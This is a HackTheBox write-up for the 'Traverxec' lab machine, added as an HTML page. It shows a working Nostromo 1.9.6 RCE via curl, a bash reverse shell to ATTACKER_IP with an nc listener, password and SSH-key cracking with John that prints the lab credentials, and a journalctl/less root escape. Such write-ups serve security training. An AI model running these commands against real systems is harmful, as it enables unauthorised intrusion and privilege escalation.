@@ -1,0 +1,249 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Traverxec</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Traverxec (HTB – Easy)</h1>
+
+<p>
+Traverxec runs the vulnerable Nostromo web server, which can be exploited for remote command execution.
+The initial foothold is obtained via a public Nostromo RCE, followed by pivoting into the <code>david</code> user
+through configuration leakage and protected web content.  
+Privilege escalation is achieved by abusing <code>journalctl</code> running in a pager (less) with root privileges.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: traverxec.htb  
+<br>Initial vector: Nostromo 1.9.6 RCE  
+<br>Lateral movement: leaked credentials → SSH key for user david  
+<br>Privilege escalation: journalctl → less escape → root shell  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp ssh (OpenSSH 7.9p1)
+80/tcp http (nostromo 1.9.6)
+</pre>
+
+<p>
+The web server is Nostromo 1.9.6, which is known to be vulnerable to RCE.  
+Searchsploit lists multiple exploits for this version.
+</p>
+
+<h2>Foothold – Nostromo 1.9.6 RCE</h2>
+
+<p>
+The exploit abuses a path traversal and command execution via a crafted URL.  
+Example manual usage with <code>curl</code>:
+</p>
+
+<pre>
+$ curl -s -X POST "http://traverxec.htb/.%0d./.%0d./.%0d./.%0d./.%0d./bin/sh" \
+  -d "/usr/bin/id"
+</pre>
+
+<p>
+To get a reverse shell:
+</p>
+
+<pre>
+$ curl -s -X POST "http://traverxec.htb/.%0d./.%0d./.%0d./.%0d./.%0d./bin/sh" \
+  -d "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/777 0>&1'"
+</pre>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 777
+</pre>
+
+<p>
+A shell is obtained as the web server user, but <code>user.txt</code> is not yet accessible.
+</p>
+
+<h2>Lateral Movement – User david</h2>
+
+<p>
+Inspect Nostromo configuration:
+</p>
+
+<pre>
+$ cd /var/nostromo/conf
+$ cat nhttpd.conf
+</pre>
+
+<p>
+The config reveals <code>homedirs</code> usage, meaning user web content is served from:
+</p>
+
+<pre>
+http://traverxec.htb/~david
+</pre>
+
+<p>
+Also in <code>/var/nostromo/conf</code> is a hashed password file.  
+Crack it with John:
+</p>
+
+<pre>
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+-> david : Nowonly4me
+</pre>
+
+<p>
+Browse to:
+</p>
+
+<pre>
+http://traverxec.htb/~david/public_www/protected-file-area
+</pre>
+
+<p>
+Authenticate with <code>david / Nowonly4me</code> and download the backup archive.  
+Extract it:
+</p>
+
+<pre>
+$ tar -xf backup-ssh-identity-files.tgz
+</pre>
+
+<p>
+Inside is <code>id_rsa</code> for user <code>david</code>, protected by a passphrase.  
+Convert and crack:
+</p>
+
+<pre>
+$ ssh2john id_rsa > hash2
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
+-> hunter
+</pre>
+
+<p>
+SSH as david:
+</p>
+
+<pre>
+$ ssh -i id_rsa david@traverxec.htb
+</pre>
+
+<p>
+Now <code>user.txt</code> is accessible.
+</p>
+
+<h2>Privilege Escalation – journalctl / less Escape</h2>
+
+<p>
+Enumerate david’s home:
+</p>
+
+<pre>
+$ ls
+bin
+</pre>
+
+<p>
+Inside <code>bin</code> is a script that uses <code>journalctl</code> with sudo (or via a wrapper).  
+Running it drops into <code>less</code> pager mode.  
+From within less, spawn a shell:
+</p>
+
+<pre>
+!/bin/bash
+</pre>
+
+<p>
+Because <code>journalctl</code> is executed with elevated privileges, the spawned shell is root.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Traverxec is a tight chain: Nostromo RCE for initial access, configuration and web content leakage to pivot into
+user <code>david</code>, and a classic <code>journalctl</code>/less escape for root.  
+It’s a great example of combining web exploitation, password cracking, and Unix privilege escalation tricks.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
